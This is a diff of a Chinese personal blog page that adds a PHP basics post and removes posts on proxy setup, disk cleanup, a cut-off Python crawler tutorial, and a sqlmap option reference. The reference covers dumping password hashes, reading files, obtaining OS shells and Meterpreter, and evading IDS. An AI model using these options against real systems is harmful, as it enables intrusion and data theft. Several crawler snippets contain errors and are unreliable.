+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231212200729647.png" alt="image-20231212200729647"></p>
+<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>函数是通过调用函数来执行的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function functionName()</span><br><span class="line">&#123;</span><br><span class="line">    // 要执行的代码</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>函数的名称应该提示出它的功能</li>
+<li>函数名称以字母或下划线开头（不能以数字开头）</li>
+</ul>
+<h3 id="PHP-面向对象"><a href="#PHP-面向对象" class="headerlink" title="PHP 面向对象"></a>PHP 面向对象</h3><p>面向对象（Object-Oriented，简称 OO）是一种编程思想和方法，它将程序中的数据和操作数据的方法封装在一起，形成”对象”，并通过对象之间的交互和消息传递来完成程序的功能。面向对象编程强调数据的封装、继承、多态和动态绑定等特性，使得程序具有更好的可扩展性、可维护性和可重用性。</p>
+<p>在面向对象的程序设计（英语：Object-oriented programming，缩写：OOP）中，对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象。</p>
+<p>在现实世界里我们所面对的事情都是对象，如计算机、电视机、自行车等。</p>
+<ul>
+<li>对象的行为：对象可以执行的操作，比如：开灯，关灯就是行为。</li>
+<li>对象的形态：对对象不同的行为是如何响应的，比如：颜色，尺寸，外型。</li>
+<li>对象的表示：对象的表示就相当于身份证，具体区分在相同的行为与状态下有什么不同。</li>
+</ul>
+<blockquote>
+<ul>
+<li><strong>类</strong> − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。</li>
+<li><strong>对象</strong> − 是类的实例。</li>
+<li><strong>成员变量</strong> − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可成为对象的属性。</li>
+<li><strong>成员函数</strong> − 定义在类的内部，可用于访问对象的数据。</li>
+<li><strong>继承</strong> − 继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</li>
+<li><strong>父类</strong> − 一个类被其他类继承，可将该类称为父类，或基类，或超类。</li>
+<li><strong>子类</strong> − 一个类继承其他类称为子类，也可称为派生类。</li>
+<li><strong>多态</strong> − 多态性是指相同的函数或方法可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。</li>
+<li><strong>重载</strong> − 简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。</li>
+<li><strong>抽象性</strong> − 抽象性是指将具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。</li>
+<li><strong>封装</strong> − 封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。</li>
+<li><strong>构造函数</strong> − 主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</li>
+<li><strong>析构函数</strong> − 析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。</li>
+</ul>
+</blockquote>
+<p>通过 Car 类 创建了三个对象：Mercedes, Bmw, 和 Audi。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$mercedes = new Car ();</span><br><span class="line">$bmw = new Car ();</span><br><span class="line">$audi = new Car ();</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/12/12/php%E5%9F%BA%E7%A1%80/" data-id="clq83vtzu0000vku428og7rx0" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
   
     <article id="post-爬虫-异步爬虫" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -481,537 +1030,10 @@
 
 
   
-    <article id="post-网络模式，ip设置和代理设置" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2023/12/05/%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F%EF%BC%8Cip%E8%AE%BE%E7%BD%AE%E5%92%8C%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE/" class="article-date">
-  <time class="post-time" datetime="2023-12-05T07:26:40.000Z" itemprop="datePublished">
-    <span class="post-month">12月</span><br/>
-    <span class="post-day">05</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/12/05/%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F%EF%BC%8Cip%E8%AE%BE%E7%BD%AE%E5%92%8C%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE/">网络模式，ip设置和代理设置</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="网络模式"><a href="#网络模式" class="headerlink" title="网络模式"></a>网络模式</h3><p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231205093335588.png" alt="image-20231205093335588"></p>
-<p>当路由器给静态ip设置为192.168.2.2，同时有人将ip动态改为192.168.2.2时，优先网给静态，也可能都没网。</p>
-<p>osi七层模型:</p>
-<ol>
-<li>物理层（Physical Layer）：该层负责在物理媒介上传输比特流（bits），处理与硬件相关的电气、光学和物理接口。</li>
-<li>数据链路层（Data Link Layer）：该层负责在直连的节点之间传输帧（frames），处理数据的帧同步、错误检测和纠正。</li>
-<li>网络层（Network Layer）：该层负责在网络上传输分组（packets），处理数据的路由、寻址和分组转发。</li>
-<li>传输层（Transport Layer）：该层负责端到端的数据传输，提供可靠的数据传输和错误恢复机制，以及数据的分段和重组。</li>
-<li>会话层（Session Layer）：该层负责建立、管理和终止会话（sessions）连接，支持跨网络节点之间的进程通信。</li>
-<li>表示层（Presentation Layer）：该层负责数据的格式化、加密和压缩，以确保不同系统之间的数据能够正确解释和传输。</li>
-<li>应用层（Application Layer）：该层负责提供应用程序之间的高级服务和协议，例如电子邮件、文件传输和远程登录。</li>
-</ol>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231205101249067.png" alt="image-20231205101249067"></p>
-<p>子网掩码（Subnet Mask）是用于划分网络的一种技术，它与IP地址一起使用来确定网络中主机的地址范围。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231205140404962.png" alt="image-20231205140404962"></p>
-<p>windows设置ip</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231205143833478.png" alt="image-20231205143833478"></p>
-<p>pc1不能访问pc2，pc3。</p>
-<p>pc2应为是通过物理机ip出去的，所以可以访问pc1。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231205144946418.png" alt="image-20231205144946418"></p>
-<h3 id="使用SwitchyOmega，google链接代理"><a href="#使用SwitchyOmega，google链接代理" class="headerlink" title="使用SwitchyOmega，google链接代理"></a>使用SwitchyOmega，google链接代理</h3><p>打开扩展-》点击应用商店</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231205192504560.png" alt="image-20231205192504560"></p>
-<p>搜索SwitchyOmega</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231205193105711.png" alt="image-20231205193105711"></p>
-<p>点击加入Chrome</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231205193210297.png" alt="image-20231205193210297"></p>
-<p>点击右上角的拼图图案，点击选择选项。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231205193603422.png" alt="image-20231205193603422"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231205193703218.png" alt="image-20231205193703218"></p>
-<h3 id="ssh-链接代理服务器"><a href="#ssh-链接代理服务器" class="headerlink" title="ssh 链接代理服务器"></a>ssh 链接代理服务器</h3><ul>
-<li>下载Proxifier</li>
-</ul>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231205154217474.png" alt="image-20231205154217474"></p>
-<p>下载地址：[Proxifier][<a target="_blank" rel="noopener" href="http://192.168.2.6:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/proxifier_137484.rar]">http://192.168.2.6:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/proxifier_137484.rar]</a></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231205155039790.png" alt="image-20231205155039790"></p>
-<p>并下载安装。</p>
-<ul>
-<li>使用</li>
-</ul>
-<p>点击配置文件-》代理服务器</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231205155631480.png" alt="image-20231205155631480"></p>
-<p>点击添加</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231205155723822.png" alt="image-20231205155723822"></p>
-<p>地址输入本机地址：127.0.0.1，端口输入：7890，协议选择SOCKS 版本5，再点击确定。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231205155955010.png" alt="image-20231205155955010"></p>
-<p>点击配置文件-》代理规则-》添加-》在应用程序中输入：ssh*;-》点击确定</p>
-<p>以后如果想在里面添加代理，只需在后面加软件名和；如：steam.exe;</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231205160315007.png" alt="image-20231205160315007"></p>
-<p>将Default的动作处改为Direct</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231205160600017.png" alt="image-20231205160600017"></p>
-<p>验证是否成功：win加r，输入cmd进入，输入ssh。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231205152914263.png" alt="image-20231205152914263"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231205152925732.png" alt="image-20231205152925732"></p>
-<p>说明放包成功</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/12/05/%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F%EF%BC%8Cip%E8%AE%BE%E7%BD%AE%E5%92%8C%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE/" data-id="clptth8ut0002u4u472bxfv9m" class="article-share-link">分享</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-sqlmap常用命令-1" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2023/12/05/sqlmap%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-1/" class="article-date">
-  <time class="post-time" datetime="2023-12-05T01:18:59.000Z" itemprop="datePublished">
-    <span class="post-month">12月</span><br/>
-    <span class="post-day">05</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/12/05/sqlmap%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-1/">sqlmap常用命令</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>sqlmap常用命令<br>-h                                           显示基本帮助信息</p>
-<p>-hh                                         显示高级帮助信息</p>
-<p>–version                                显示版本号</p>
-<p>-v                                           详细等级（0-6 默认 1）</p>
-<pre><code>                                          0：只显示python错误以及重要信息
-
-                                          1：显示信息以及警告
-
-                                          2：显示debug消息
-
-                                          3：显示注入payload
-
-                                          4：显示http请求
-
-                                          5：显示http响应头·
-
-                                          6：显示http响应内容
-</code></pre>
-<p>Target：                                </p>
-<p>-u                                          指定目标url</p>
-<p>-d                                          直接连接数据库</p>
-<p>-l                                           从burp代理日志的解析目标</p>
-<p>-r                                           从文件中加载http请求</p>
-<p>-g                                          从google dork的结果作为目标url</p>
-<p>-c                                          从INI配置文件中加载选项</p>
-<p>Request</p>
-<p>-A                                         指定user-agent头</p>
-<p>-H                                         额外的header</p>
-<p>-method&#x3D;                              指定HTTP方法（GET&#x2F;POST）</p>
-<p>–data&#x3D;                                 通过POST提交数据    </p>
-<p>–param-del&#x3D;                        指定参数分隔符</p>
-<p>–cookie&#x3D;                              指定cookie的值</p>
-<p>–cookie-del&#x3D;                        指定cookie分隔符</p>
-<p>–drop-set-cookie                  扔掉response中的set-cookie头</p>
-<p>–random-agent                    使用随机的user-agent头</p>
-<p>–host&#x3D;                                  设置host头 </p>
-<p>–referer&#x3D;                              指定referer头</p>
-<p>–headers&#x3D;                            额外的headers</p>
-<p>–auth-type&#x3D;                          http认证类型（Basic，NTLM，Digest）</p>
-<p>–auith-cred&#x3D;                         http认证凭证（账号：密码）</p>
-<p>–ignore-proxy                       忽略系统代理（常用于扫描本地文件）</p>
-<p>–proxy&#x3D;                                使用代理</p>
-<p>–proxy-cred&#x3D;                        代理认证证书（账号：密码）</p>
-<p>–delay&#x3D;                                 设置延迟时间（两个请求之间）</p>
-<p>–timeout&#x3D;                              超时时来连接前等待（默认 30）</p>
-<p>–retries&#x3D;                                连接超时时重试次数（默认 3）</p>
-<p>–randomize&#x3D;                         随机更改指定的参数的值</p>
-<p>–safe-url&#x3D;                             在测试期间经常访问的URL</p>
-<p>–safe-post&#x3D;                           POST数据发送到安全的URL</p>
-<p>–safe-freq&#x3D;                           两次请求之间穿插一个安全的URL   </p>
-<p>–skip-urlencode                    跳过payload数据的URL编码</p>
-<p>–chunked                             使用HTTP分块传输加密POST请求</p>
-<p>–hpp                                    使用HTTP参数pollution方法（常用于绕过IPS&#x2F;IDS检测）</p>
-<p>–force-ssl                             强制使用SSL&#x2F;HTTPS</p>
-<p>–eval&#x3D;value                         请求之前提供Python代码（eg：”import hashlib;id2&#x3D;hashlib.md5(id).hexdigest()”）</p>
-<p>Optimization</p>
-<p>-o                                         打开所有优化开关</p>
-<p>–predict-output                   预测输出（与–threads不兼容）</p>
-<p>–keep-alive                         建立长久的HTTP(S)连接 (与–proxy不兼容)</p>
-<p>–null-connection                 空连接</p>
-<p>–threads&#x3D;value                  设置线程(默认 1)</p>
-<p>Injection</p>
-<p>-p                                       指定测试参数</p>
-<p>–skip&#x3D;                               跳过指定参数的测试</p>
-<p>–skip-static                        跳过测试静态的参数</p>
-<p>–dbms&#x3D;                             指定具体DBMS</p>
-<p>–os&#x3D;                                  指定DBMS操作系统</p>
-<p>–invalid-bignum                使用大数字使值无效</p>
-<p>–invalid-logical                  使用逻辑符使值无效</p>
-<p>–invalid-string                   使用字符串使值无效</p>
-<p>–no-cast                             关闭payload铸造机制</p>
-<p>–no-escape                       关闭字符转义机制（默认自动开启）</p>
-<p>–prefix&#x3D;                             加入payload前缀</p>
-<p>–suffix&#x3D;                              加入payload后缀</p>
-<p>–tamper&#x3D;                          指定使用的脚本</p>
-<p>Detectiong</p>
-<p>–level&#x3D;                              指定测试的等级（1-5 默认为1）</p>
-<p>–risk&#x3D;                               指定测试的风险（0-3 默认为1）</p>
-<p>–string&#x3D;                            登录成功时，页面所含有的“关键字” 用于证明已经登录成功</p>
-<p>–not-string&#x3D;                      登录成功时，页面所含有的“关键字” 用于证明已经登录失败</p>
-<p>–code&#x3D;                             查询为真时，匹配的HTTP代码</p>
-<p>–smart                              当有大量检测目标时，只选择基于错误的检测结果</p>
-<p>–text-only                         仅基于文本内容比较网页</p>
-<p>–titles                               仅基于标题比较网页</p>
-<p>Techniques</p>
-<p>–technique&#x3D;                      指定sql注入技术（默认BEUSTQ）</p>
-<p>–time-sec&#x3D;                        基于时间注入检测相应的延迟时间（默认为5秒）</p>
-<p>–union-clos&#x3D;                     进行查询时，指定列的范围</p>
-<p>–union-char&#x3D;                    指定暴力破解列数的字符</p>
-<p>Fingerprint</p>
-<p>-f                                      查询目标DBMS版本指纹信息</p>
-<p>Emuneration</p>
-<p>-a                                    查询所有  </p>
-<p>-b                                    查询目标DBMS banner信息</p>
-<p>–current-user                 查询目标DBMS当前用户</p>
-<p>–current-db                    查询目标DBMS当前数据库</p>
-<p>–is-dba                          查询目标DBMS当前用户是否为DBA</p>
-<p>–users                            枚举目标DBMS所有的用户</p>
-<p>–paswords                     枚举目标DBMS用户密码哈希值</p>
-<p>–privileges                     枚举目标DBMS用户的权限</p>
-<p>–roles                            枚举DBMS用户的角色</p>
-<p>–dbs                              枚举DBMS所有的数据库</p>
-<p>–tables                          枚举DBMS数据库中所有的表</p>
-<p>–columns                      枚举DBMS数据库表中所有的列</p>
-<p>–count                         检索表的条目的数量</p>
-<p>–dump                         存储DBMS数据库的表中的条目</p>
-<p>–dump-all                     存储DBMS所有数据库表中的条目</p>
-<p>–D db                          指定进行枚举的数据库名称</p>
-<p>–T   table                     指定进行枚举的数据库表名称</p>
-<p>–C   column                 指定进行枚举的数据库列名称</p>
-<p>–exclude-sysdbs          枚举表时排除系统数据库</p>
-<p>–sql-query                    指定查询的sql语句</p>
-<p>–sql-shell                     提示输入一个交互式sql shell</p>
-<p>Brute force</p>
-<p>–common-tables                       暴力破解表 </p>
-<p>–common-colomns                    暴力破解列</p>
-<p>File system access</p>
-<p>–file-read                            从目标数据库管理文件系统读取文件</p>
-<p>–file-write                           上传文件到目标数据库管理文件系统</p>
-<p>–file-dest                             指定写入文件的绝对路径</p>
-<p>–os-cmd&#x3D;                           执行操作系统命令</p>
-<p>–os-shell                            交互式的系统shell</p>
-<p>–os-pwn                             获取一个OOB shell，Meterpreter或者VNC</p>
-<p>–os-smbrelay                    一键 获取一个OOB shell，Meterpreter或者VNC</p>
-<p>–os-bof                              储存过程缓冲区溢出利用</p>
-<p>–os-esc                              数据库进程用户权限提升</p>
-<p>–msf-path&#x3D;                        Metasploit  Framework本地安装路径</p>
-<p>General</p>
-<p>-s                                     sqlite会话文件保存位置</p>
-<p>-t                                      记录所有HTTP流量到指定文件中</p>
-<p>–batch                             测试过程中， 执行所有默认配置</p>
-<p>–charset&#x3D;v                      强制用于数据检索的字符编码 </p>
-<p>–crawl&#x3D;                           从目标URL开始爬取网站</p>
-<p>–crawl-exclude&#x3D;              禁止爬取某个页面（eg：logout）</p>
-<p>–csv-del&#x3D;                        指定CSV输出中使用的的字符</p>
-<p>–dump-format&#x3D;               储存数据的方式（CSV(default)，HTML，SQLITE）</p>
-<p>–flush-session                 刷新当前目标的会话文件</p>
-<p>–fresh-queries                 忽略会话文件中储存的查询结果，重新查询</p>
-<p>–hex                                使用DBMS hex函数进行数据检索</p>
-<p>–outpout-dir&#x3D;                  自定义输出目录</p>
-<p>–save&#x3D;                            保存选项到INI配置文件中</p>
-<p>–scope&#x3D;                          使用正则表达式从提供的日志中guo’l</p>
-<p>–alert                               再找到SQL注入时运行主机操作系统命令</p>
-<p>–purge-output                  安全的从输出目录中删除所有内容</p>
-<p>–sqlmap-shell                  提示输入交互式sqlmap  shell</p>
-<p>–update                           更新sqlmap</p>
-<p>sqlmap注入技术简介<br>–technique&#x3D;     （默认全部使用）</p>
-<p>B       基于布尔的盲注</p>
-<p>T       基于时间的盲注</p>
-<p>E      基于报错的注入</p>
-<p>U      基于UNION查询注入</p>
-<p>S      基于多语句查询注入</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/12/05/sqlmap%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-1/" data-id="clprnnu8v0001ccu4dqo142mf" class="article-share-link">分享</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-c盘清理-1" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2023/12/05/c%E7%9B%98%E6%B8%85%E7%90%86-1/" class="article-date">
-  <time class="post-time" datetime="2023-12-05T01:18:34.000Z" itemprop="datePublished">
-    <span class="post-month">12月</span><br/>
-    <span class="post-day">05</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/12/05/c%E7%9B%98%E6%B8%85%E7%90%86-1/">c盘清理</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="c盘清理"><a href="#c盘清理" class="headerlink" title="c盘清理"></a>c盘清理</h2><p>下载Dism++x64<img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231130091452335.png" alt="image-20231130091452335"></p>
-<p>打开Dism++x64.exe,打开空间回收，并全选，点击扫描，再点击清理。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231130091651320.png" alt="image-20231130091651320"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/12/05/c%E7%9B%98%E6%B8%85%E7%90%86-1/" data-id="clprnnu8o0000ccu44xkh9ijw" class="article-share-link">分享</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-尚硅谷-爬虫-python爬虫" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2023/12/04/%E5%B0%9A%E7%A1%85%E8%B0%B7-%E7%88%AC%E8%99%AB-python%E7%88%AC%E8%99%AB/" class="article-date">
-  <time class="post-time" datetime="2023-12-04T05:31:20.000Z" itemprop="datePublished">
-    <span class="post-month">12月</span><br/>
-    <span class="post-day">04</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/12/04/%E5%B0%9A%E7%A1%85%E8%B0%B7-%E7%88%AC%E8%99%AB-python%E7%88%AC%E8%99%AB/">尚硅谷—爬虫-python爬虫</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="python爬虫"><a href="#python爬虫" class="headerlink" title="python爬虫"></a>python爬虫</h2><h3 id="页面结构"><a href="#页面结构" class="headerlink" title="页面结构"></a>页面结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">    table 表格</span><br><span class="line">    tr    行</span><br><span class="line">    td    列</span><br><span class="line">    ul   li    无序列表</span><br><span class="line">    ol   li    有序列表</span><br><span class="line">    &lt;a href=&quot;链接&quot;&gt;&lt;/a&gt;     超文本</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="爬虫基本使用"><a href="#爬虫基本使用" class="headerlink" title="爬虫基本使用"></a>爬虫基本使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from urllib.request</span><br><span class="line">url = &quot;http://www.baidu.com&quot;</span><br><span class="line">resp = urlopen.request.urlopen(url)</span><br><span class="line">content = resp.read().decode(&quot;utf-8&quot;)</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204173459242.png" alt="image-20231204173459242"></p>
-<h3 id="一个类型和6个方法"><a href="#一个类型和6个方法" class="headerlink" title="一个类型和6个方法"></a>一个类型和6个方法</h3><blockquote>
-<ul>
-<li>一个类型HTTPResponse</li>
-<li>六个方法read  readline  readlines  getcode  geturl  getheaders</li>
-</ul>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一个类型指的是response是HTTPResponse类型</span><br><span class="line">print(type(response))</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204185730132.png" alt="image-20231204185730132"></p>
-<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urllib.request.urlretrieve(url,&quot;文件要加后最名&quot;)</span><br></pre></td></tr></table></figure>
-
-<h3 id="请求对象的定制"><a href="#请求对象的定制" class="headerlink" title="请求对象的定制"></a>请求对象的定制</h3><p>uA介绍:user Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU类型、浏览器及版本。浏览器内核、浏览器渲染引擎、浏览器语言、浏览器插件等。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法: request = urllib.request.Request()</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204192039265.png" alt="image-20231204192039265"></p>
-<h3 id="初级代码"><a href="#初级代码" class="headerlink" title="初级代码"></a>初级代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">#https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=%E5%91%A8%E6%9D%B0%E4%BC%A6</span><br><span class="line"></span><br><span class="line"># 定义一个函数，用于获取百度搜索结果</span><br><span class="line">url = &quot;https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=%E5%91%A8%E6%9D%B0%E4%BC%A6&quot;</span><br><span class="line"></span><br><span class="line">request = urllib.request.Request(url)   </span><br><span class="line">response = urllib.request.urlopen(request)</span><br><span class="line">html = response.read().decode(&quot;utf-8&quot;)</span><br><span class="line">print(html)</span><br></pre></td></tr></table></figure>
-
-<h3 id="get请求urlencode方法"><a href="#get请求urlencode方法" class="headerlink" title="get请求urlencode方法"></a>get请求urlencode方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">date = &#123;</span><br><span class="line">	&#x27;wd&#x27;:&#x27;周杰伦&#x27;</span><br><span class="line">	&#x27;sex&#x27;:&#x27;男&#x27;</span><br><span class="line">	&#x27;location&#x27;:&#x27;中国台湾省&#x27;</span><br><span class="line">&#125;</span><br><span class="line">a = urllib.parse.urlencode(date)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204202050234.png" alt="image-20231204202050234"></p>
-<h3 id="post请求翻译"><a href="#post请求翻译" class="headerlink" title="post请求翻译"></a>post请求翻译</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#爬取翻译网页https://fanyi.baidu.com/sug，并翻译spider</span><br><span class="line">import urllib.parse</span><br><span class="line">import urllib.request</span><br><span class="line">import json</span><br><span class="line">url = &#x27;https://fanyi.baidu.com/sug&#x27;</span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;kw&#x27;:&#x27;spider&#x27;</span><br><span class="line">&#125;</span><br><span class="line">data = 